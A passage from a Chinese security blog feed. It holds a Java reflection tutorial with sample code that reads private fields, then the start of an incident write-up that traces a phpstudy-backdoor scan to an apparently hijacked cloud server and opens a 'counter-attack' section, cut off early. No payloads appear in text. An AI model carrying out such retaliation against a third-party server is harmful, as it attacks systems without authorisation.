align="left">代表字节码中的构造方法字节码。代表类中的构造方法（方法名同类名相同且无参的方法）。</td></tr><tr><td align="center">java.lang.reflect.Field</td><td align="left">代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。</td></tr></tbody></table><p><font color=red>必须通过Class获取类过后才能获取Method、Constructor、Field</font><br>也就是说Class是反射实现的前提。且Class并不是new出来的，而是java内置的。</p><h3 id="2、Class访问类"><a href="#2、Class访问类" class="headerlink" title="2、Class访问类"></a>2、Class访问类</h3><p><strong>Class获取方式</strong></p><table><thead><tr><th align="center">方式</th><th align="center">示例注解</th></tr></thead><tbody><tr><td align="center">Class.forName(“完整类名带包名”)</td><td align="center">Class A&#x3D;Class.forName(“com.java.reflect.people”);</td></tr><tr><td align="center">对象.getClass()</td><td align="center">people peo&#x3D;new people();Class A&#x3D;peo.getClass();</td></tr><tr><td align="center">任何类型.class</td><td align="center">Class A &#x3D; String.class;</td></tr></tbody></table><p><strong>反射类可访问的常用方法</strong><br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-2.png" title="常用方法"></p><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三种获取类的实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-4.png" title="Class类获取"></p><h3 id="2、Field访问成员变量"><a href="#2、Field访问成员变量" class="headerlink" title="2、Field访问成员变量"></a>2、Field访问成员变量</h3><p>通过下列任意一个方法访问成员变量时将返回 Field 类型的对象或数组。<br><strong>Field声明使用的方法</strong></p><table><thead><tr><th align="center">Field声明时的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getFields()</td><td align="center">获取所有权限为public的成员变量</td></tr><tr><td align="center">getField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr><tr><td align="center">getDeclaredFields()</td><td align="center">获取当前对象的所有成员变量</td></tr><tr><td align="center">getDeclaredField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr></tbody></table><p>注：针对private私有的变量，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有变量</p><p><strong>Field常用方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获得该成员变量的名称</td></tr><tr><td align="center">getType()</td><td align="left">获取表示该成员变量的 Class 对象</td></tr><tr><td align="center">get(Object obj)</td><td align="left">获得指定对象 obj 中成员变量的值，返回值为 Object 类型</td></tr><tr><td align="center">set(Object obj, Object value)</td><td align="left">将指定对象 obj 中成员变量的值设置为 value</td></tr><tr><td align="center">getlnt(0bject obj)</td><td align="left">获得指定对象 obj 中成员类型为 int 的成员变量的值</td></tr><tr><td align="center">setlnt(0bject obj, int i)</td><td align="left">将指定对象 obj 中成员变量的值设置为 i</td></tr><tr><td align="center">setFloat(Object obj, float f)</td><td align="left">将指定对象 obj 中成员变量的值设置为 f</td></tr><tr><td align="center">getBoolean(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 boolean 的成员变量的值</td></tr><tr><td align="center">setBoolean(Object obj, boolean b)</td><td align="left">将指定对象 obj 中成员变量的值设置为 b</td></tr><tr><td align="center">getFloat(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 float 的成员变量的值</td></tr><tr><td align="center">setAccessible(boolean flag)</td><td align="left">此方法可以设置是否忽略权限直接访问 private 等私有权限的成员变量</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //三种获取类的方式</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line"></span><br><span class="line">        //进行反射类实例化</span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        //System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        //Field访问成员变量</span><br><span class="line">        //反射获取类变量</span><br><span class="line">        Field A=people1.getDeclaredField(&quot;name&quot;);</span><br><span class="line">        //由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span><br><span class="line">        A.setAccessible(true);</span><br><span class="line">        //反射设置类中的变量值</span><br><span class="line">        A.set(obj,&quot;张三&quot;);</span><br><span class="line">        //输出该obj对象中变量的变量值</span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Field实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-5.png" title="Field实现"></p><h3 id="3、Method访问成员方法"><a href="#3、Method访问成员方法" class="headerlink" title="3、Method访问成员方法"></a>3、Method访问成员方法</h3><p>要动态获取一个对象方法的信息，首先需要通过下列方法之一创建一个<code>Method</code>类型的对象或者数组。<br><strong>Method声明使用的方法</strong></p><table><thead><tr><th align="center">Method声明使用的方法</th><th align="left">注解</th></tr></thead><tbody><tr><td align="center">getMethods()</td><td align="left">获取所有权限为public的成员方法</td></tr><tr><td align="center">getMethods(String name,Class&lt;?&gt; …parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr><tr><td align="center">getDeclaredMethods()</td><td align="left">获取的成员所有的方法</td></tr><tr><td align="center">getDeclaredMethods(String name,Class&lt;?&gt;…parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr></tbody></table><p>注：针对private私有的方法，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有方法</p><p><strong>Method常用方法</strong></p><table><thead><tr><th align="center">静态方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获取该方法的名称</td></tr><tr><td align="center">getParameterType()</td><td align="left">按照声明顺序以 Class 数组的形式返回该方法各个参数的类型</td></tr><tr><td align="center">getReturnType()</td><td align="left">以 Class 对象的形式获得该方法的返回值类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获得该方法可能抛出的异常类型</td></tr><tr><td align="center">invoke(Object obj,Object…args)</td><td align="left">利用 args 参数执行指定对象 obj 中的该方法，返回值为 Object 类型</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该方法是否允许带有可变数量的参数，如果允许返回 true，否则返回 false</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public void setinfo(String name,String phone,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.phone=phone;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    public String show()&#123;</span><br><span class="line">        return &quot;&#123;name:&quot;+name+&quot;;age:&quot;+age+&quot;;phone:&quot;+phone+&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //三种获取类的方式</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line"></span><br><span class="line">        //进行反射类实例化</span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        //System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        //Field访问成员变量</span><br><span class="line">        //反射获取类变量</span><br><span class="line">        Field A=people1.getDeclaredField(&quot;name&quot;);</span><br><span class="line">        //由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span><br><span class="line">        A.setAccessible(true);</span><br><span class="line">        //反射设置类中的变量值</span><br><span class="line">        A.set(obj,&quot;张三&quot;);</span><br><span class="line">        //输出该obj对象中变量的变量值</span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        //Method访问成员setinfo()方法并传参设置变量值</span><br><span class="line">        Method mt=people1.getDeclaredMethod(&quot;setinfo&quot;, String.class, String.class, int.class);</span><br><span class="line">        //Method调用方法传参</span><br><span class="line">        Object mtobj=mt.invoke(obj,&quot;张三&quot;,&quot;13011111111&quot;,18);</span><br><span class="line">        //Method访问成员show()方法</span><br><span class="line">        Method mt2=people1.getDeclaredMethod(&quot;show&quot;);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Method实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-6.png" title="Method实现"></p><h3 id="4、Constructor访问成员构造方法"><a href="#4、Constructor访问成员构造方法" class="headerlink" title="4、Constructor访问成员构造方法"></a>4、Constructor访问成员构造方法</h3><p>为了能够动态获取对象构造方法的信息，首先需要通过下列方法之一创建一个 Constructor 类型的对象或者数组。<br><strong>Constructor声明使用的方法</strong></p><table><thead><tr><th align="center">Constructor声明使用的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取所有权限为public的构造方法</td></tr><tr><td align="center">getDeclaredConstructors()</td><td align="center">获取当前对象的所有构造方法</td></tr><tr><td align="center">getDeclaredConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取当前对象所有带参数类型的构造方法</td></tr></tbody></table><p><strong>Constructor常用的方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">public String getName()</td><td align="left">返回构造方法名</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该构造方法是否允许带可变数量的参数，如果允许，返回 true，否则返回false</td></tr><tr><td align="center">getParameterTypes()</td><td align="left">按照声明顺序以 Class 数组的形式获取该构造方法各个参数的类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获取该构造方法可能抛出的异常类型</td></tr><tr><td align="center">newInstance(Object … initargs)</td><td align="left">通过该构造方法利用指定参数创建一个该类型的对象，如果未设置参数则表示采用默认无参的构造方法</td></tr><tr><td align="center">setAccessiable(boolean flag)</td><td align="left">如果该构造方法的权限为 private，默认为不允许通过反射利用 netlnstance()方法创建对象。如果先执行该方法，并将入口参数设置为 true，则允许创建对象</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该构造方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public void setinfo(String name,String phone,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.phone=phone;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    public people()&#123;</span><br><span class="line">        System.out.print(&quot;调用了无参构造方法：&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public people(String name,String phone,int age)&#123;</span><br><span class="line">        setinfo(name,phone,age);</span><br><span class="line">        System.out.print(&quot;调用了带参数的构造方法：&quot;+show());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String show()&#123;</span><br><span class="line">        return &quot;&#123;name:&quot;+name+&quot;;age:&quot;+age+&quot;;phone:&quot;+phone+&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //三种获取类的方式</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line"></span><br><span class="line">        //进行反射类实例化</span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        //System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        //Field访问成员变量</span><br><span class="line">        //反射获取类变量</span><br><span class="line">        Field A=people1.getDeclaredField(&quot;name&quot;);</span><br><span class="line">        //由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span><br><span class="line">        A.setAccessible(true);</span><br><span class="line">        //反射设置类中的变量值</span><br><span class="line">        A.set(obj,&quot;张三&quot;);</span><br><span class="line">        //输出该obj对象中变量的变量值</span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        //Method访问成员setinfo()方法并传参设置变量值</span><br><span class="line">        Method mt=people1.getDeclaredMethod(&quot;setinfo&quot;, String.class, String.class, int.class);</span><br><span class="line">        //Method调用方法传参</span><br><span class="line">        Object mtobj=mt.invoke(obj,&quot;张三&quot;,&quot;13011111111&quot;,18);</span><br><span class="line">        //Method访问成员show()方法</span><br><span class="line">        Method mt2=people1.getDeclaredMethod(&quot;show&quot;);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;----------分割线--------&quot;);</span><br><span class="line"></span><br><span class="line">        //Constructor访问成员构造方法</span><br><span class="line">        //方法一、通过newInstance()调用无参构造方法</span><br><span class="line">        Object obj2=people1.newInstance();</span><br><span class="line">        System.out.println(&quot; 方法一：直接通过newInstance()调用无参构造方法&quot;);</span><br><span class="line">        //方法二、通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法</span><br><span class="line">        Constructor ct=people1.getDeclaredConstructor(String.class, String.class, int.class);</span><br><span class="line">        Object obj3=ct.newInstance(&quot;张四&quot;,&quot;13022222222&quot;,19);</span><br><span class="line">        System.out.println(&quot; 方法二：通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法&quot;);</span><br><span class="line">        //方法三、通过getDeclaredConstructor()调用无参构造方法</span><br><span class="line">        Constructor ct2=people1.getDeclaredConstructor();</span><br><span class="line">        Object obj4=ct2.newInstance();</span><br><span class="line">        System.out.println(&quot; 方法三：通过getDeclaredConstructor()调用无参构造方法&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Constructor实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-7.png" title="Constructor实现"></p><h1 id="0x02、思考"><a href="#0x02、思考" class="headerlink" title="0x02、思考"></a>0x02、思考</h1><p>Java反射是真的累啊看下来，为了实现动态对类的操作，绕了很大一圈，多出来很多代码去实现这个功能，但确实使用反射很大程度降低了代码之间的依赖性，实现动态加载。<br>java反射核心想法就是：突破常规访问限制，就是为了动态访问类。<br>导致的安全问题也是因为突破常规访问限制，利用反射去访问对象以及篡改变量值包括一些私有属性的变量。</p><h1 id="0x03、参考链接"><a href="#0x03、参考链接" class="headerlink" title="0x03、参考链接"></a>0x03、参考链接</h1><p><a href="http://c.biancheng.net/view/6907.html">http://c.biancheng.net/view/6907.html</a><br><a href="https://blog.csdn.net/qq_44715943/article/details/120587716">https://blog.csdn.net/qq_44715943/article/details/120587716</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次普通的攻击溯源排查</title>
      <link href="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/"/>
      <url>/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>一次恶意扫描触发的告警，溯源排查攻击源IP，简单记一下这次的溯源排查流程。</p><h2 id="0x01、告警"><a href="#0x01、告警" class="headerlink" title="0x01、告警"></a>0x01、告警</h2><p>可以看是<font color=red>同一时间</font>的告警，受害IP为该C段下的三台业务服务器，触发的三条告警，可直接判断为<font color=red>恶意扫描</font>。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/gj-1.png" title="告警"><br>查看攻击流量http报文，可看到phpstudy的后门利用payload，排除误报。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/gj-2.png" title="告警报文"><br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/gj-3.png" title="告警payload"> </p><h2 id="0x02、溯源排查"><a href="#0x02、溯源排查" class="headerlink" title="0x02、溯源排查"></a>0x02、溯源排查</h2><p>针对攻击源IP，进行常规溯源流程（威胁情报、域名反查、IP端口开放情况、可利用的漏洞等）</p><h3 id="攻击源IP情况："><a href="#攻击源IP情况：" class="headerlink" title="攻击源IP情况："></a>攻击源IP情况：</h3><p>直接丢ti、微步、360威胁情报同理，取有用信息。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-1.png" title="威胁情报"><br>攻击源ip：绵阳阿里云<br>有用信息就只有反查域名，注册过m.xxx.cn，还有一些其他域名，查了没啥有用的。<br>查看m.xxx.cn域名信息，该域名为一家装饰公司备案的，也有备案号。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-2.png" title="域名查询"><br>同时ping该域名也是正常解析到攻击源IP上的，说明当前域名与攻击IP是绑定匹配的，时效期内。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-3.png" title="域名IP绑定"><br>同时威胁情报也能看到对应开放的端口，但大部分时效性不强，可以结合fofa查看或者自己扫描攻击源IP开放的端口。<br>扫描查看到攻击源IP开放了80、3389、8085等端口。<br>访问web页面，访问跳转&#x2F;index2.php页面，标题为屠龙之怒，与该公司名称xx装饰集团四川有限公司业务不符，疑为该公司网站被挂黑链，服务器被当作跳板对外发出恶意扫描。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-4.png" title="web应用"> </p><p>攻击源IP简述:<br>1、绵阳阿里云服务器<br>2、注册域名为m.xxx.cn，为某装修公司，域名与IP绑定匹配。<br>3、web应用跳转游戏，疑似被挂黑页，疑为肉鸡。</p><h3 id="攻击源IP反制："><a href="#攻击源IP反制：" class="headerlink" title="攻击源IP反制："></a>攻击源IP反制：</h3><p>一来就看游戏入口去了，一个游戏页面，简单抓了包<br><img 